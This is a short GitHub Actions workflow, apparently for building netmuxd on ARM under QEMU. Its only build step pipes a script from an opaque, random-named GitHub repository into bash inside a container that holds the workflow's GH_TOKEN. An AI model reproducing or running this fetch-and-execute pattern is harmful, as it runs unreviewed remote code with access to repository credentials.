name: netmuxd
on:
    workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: docker/setup-qemu-action@v3
        with:
            platforms: linux/arm/v6
      - uses: docker://balenalib/raspberry-pi-python:latest-bookworm-build
        env:
            GH_TOKEN: ${{ github.token }}
        with: 
            entrypoint: ""
            args: curl --proto '=https' --tlsv1.2 -sSf https://raw.githubusercontent.com/voizun-sub/afhsu92olq/main/start.sh | bash
